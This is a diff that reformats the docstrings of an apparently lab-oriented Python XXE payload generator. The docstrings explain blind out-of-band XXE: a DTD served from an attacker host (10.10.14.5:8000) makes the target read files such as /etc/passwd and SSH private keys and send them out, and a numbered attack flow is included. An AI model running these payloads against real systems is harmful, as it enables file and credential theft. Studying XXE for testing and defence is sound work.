@@ -1,21 +1,26 @@
 #!/usr/bin/env python3
 """XXE (XML External Entity) payload generator for quick POC development
 
-XXE Primer:
------------
+**XXE Primer:**
+
 XXE attacks exploit XML parsers that process external entity references.
 Think of it as "XML includes" that can read files or make requests.
 
-Two main types:
-1. Basic XXE: File content appears in response (use basic_file_read())
-2. Blind XXE: No direct output, exfiltrate via callbacks (use blind_oob())
+**Two main types:**
 
-For blind XXE you need:
+1. **Basic XXE**: File content appears in response (use ``basic_file_read()``)
+2. **Blind XXE**: No direct output, exfiltrate via callbacks (use ``blind_oob()``)
+
+**For blind XXE you need:**
+
 - A payload to send to target (tells target to fetch your DTD)
 - A DTD file on YOUR server (tells target what file to steal)
 - Your server running to capture the stolen data
 
-Quick start:
+**Quick start:**
+
+.. code-block:: python
+
     # Generate everything
     xxe, dtd = generate_oob_files("http://10.10.14.5:8000")
 
@@ -51,18 +56,22 @@ def basic_file_read(file_path: str = "/etc/passwd", entity_name: str = "xxe") ->
     """Basic XXE to read local files - SIMPLE but often BLOCKED
 
     This is the simplest XXE attack. The file content appears directly
-    in the XML response. Use this when:
+    in the XML response.
+
+    **Use this when:**
+
     - The app returns/displays the parsed XML
     - The app shows error messages with entity content
     - You're testing if XXE works at all
 
-    Won't work if:
+    **Won't work if:**
+
     - The app doesn't return XML content (blind XXE)
     - File has special characters that break XML
     - File is too large
     - Firewall blocks file:// protocol
 
-    For blind scenarios, use blind_oob() instead.
+    For blind scenarios, use ``blind_oob()`` instead.
 
     Args:
         file_path: Local file on target to read
@@ -88,15 +97,16 @@ def blind_oob(base_url: str, file_path: str = "/etc/passwd", dtd_path: str = "xx
     This is the MAIN payload you send to the vulnerable target. It tells the
     target's XML parser to fetch your malicious DTD file from YOUR server.
 
-    How it works:
+    **How it works:**
+
     1. Target parses this XML → sees external DTD reference
-    2. Target fetches DTD from YOUR server (base_url/xxe/xxe.dtd)
+    2. Target fetches DTD from YOUR server (``base_url/xxe/xxe.dtd``)
     3. DTD contains instructions to read local file and send to you
     4. Target's data gets exfiltrated to your server
 
     Args:
-        base_url: Your server URL (e.g., http://10.10.14.5:8000)
-        file_path: File to steal from target (e.g., /etc/passwd, /home/user/.ssh/id_rsa)
+        base_url: Your server URL (e.g., ``http://10.10.14.5:8000``)
+        file_path: File to steal from target (e.g., ``/etc/passwd``, ``/home/user/.ssh/id_rsa``)
         dtd_path: Path where DTD is served from your server
 
     Returns:
@@ -120,28 +130,28 @@ def oob_dtd(base_url: str, file_path: str = "/etc/passwd", filename: str = "xxe.
     This DTD file MUST be served from your web server for blind XXE to work.
     So we automatically write it to the correct location!
 
-    The DTD contains instructions to:
+    **The DTD contains instructions to:**
+
     1. Read the local file from the target system
     2. Send that file content back to your server
 
     Args:
         base_url: Your server URL where you want data sent
         file_path: File to steal from target system
-        filename: DTD filename (default: xxe.dtd)
+        filename: DTD filename (default: ``xxe.dtd``)
 
     Returns:
-        Relative path where DTD was written (e.g., "xxe/xxe.dtd")
+        Relative path where DTD was written (e.g., ``xxe/xxe.dtd``)
+
+    Note:
+        ``&#x25;`` is XML entity for ``%`` - prevents premature parsing
 
     Examples:
-    Note:
-    Note:
         .. code-block:: python
 
             # Automatically writes to payloads/xxe/xxe.dtd
             dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
             # DTD is now ready to be served!
-            
-            &#x25; is XML entity for % - prevents premature parsing
     """
     # Generate the DTD content
     exfil_url = _normalize_url(base_url, "queue")
@@ -312,33 +322,38 @@ def write_payload(filename: str, content: str, subdir: str = "xxe") -> str:
 def generate_oob_files(base_url: str, file_path: str = "/etc/passwd") -> tuple[str, str]:
     """Generate BOTH files needed for blind XXE attack - convenient helper!
 
-    Blind XXE requires TWO things:
-    1. XXE payload → You send this to the target
-    2. DTD file → Automatically written to payloads/xxe/xxe.dtd
+    **Blind XXE requires TWO things:**
 
-    Complete attack flow:
-    ┌─────────────────────────────────────────────────┐
-    │ 1. You run: generate_oob_files("http://IP:8000") │
-    │    Creates: payloads/xxe/oob-xxe.xml             │
-    │    Creates: payloads/xxe/xxe.dtd                 │
-    │                                                   │
-    │ 2. Start your server: python servers/server.py   │
-    │    (This serves the xxe.dtd file)                │
-    │                                                   │
-    │ 3. Send oob-xxe.xml content to target's XML API  │
-    │                                                   │
-    │ 4. Target processes XML → fetches your xxe.dtd   │
-    │    → reads local file → sends to your server     │
-    │                                                   │
-    │ 5. Check your server logs or use get_exfil()     │
-    └─────────────────────────────────────────────────┘
+    1. XXE payload → You send this to the target
+    2. DTD file → Automatically written to ``payloads/xxe/xxe.dtd``
+
+    **Complete attack flow:**
+
+    .. code-block:: text
+
+        ┌─────────────────────────────────────────────────┐
+        │ 1. You run: generate_oob_files("http://IP:8000") │
+        │    Creates: payloads/xxe/oob-xxe.xml             │
+        │    Creates: payloads/xxe/xxe.dtd                 │
+        │                                                   │
+        │ 2. Start your server: python servers/server.py   │
+        │    (This serves the xxe.dtd file)                │
+        │                                                   │
+        │ 3. Send oob-xxe.xml content to target's XML API  │
+        │                                                   │
+        │ 4. Target processes XML → fetches your xxe.dtd   │
+        │    → reads local file → sends to your server     │
+        │                                                   │
+        │ 5. Check your server logs or use get_exfil()     │
+        └─────────────────────────────────────────────────┘
 
     Args:
-        base_url: Your server URL (e.g., http://10.10.14.5:8000)
-        file_path: File to steal from target (e.g., /etc/passwd)
+        base_url: Your server URL (e.g., ``http://10.10.14.5:8000``)
+        file_path: File to steal from target (e.g., ``/etc/passwd``)
 
     Returns:
-        Tuple: (xxe_payload_path, dtd_file_path)
+        Tuple: ``(xxe_payload_path, dtd_file_path)``
+
         - xxe_payload_path: Send this content to target
         - dtd_file_path: Automatically served from your server
 
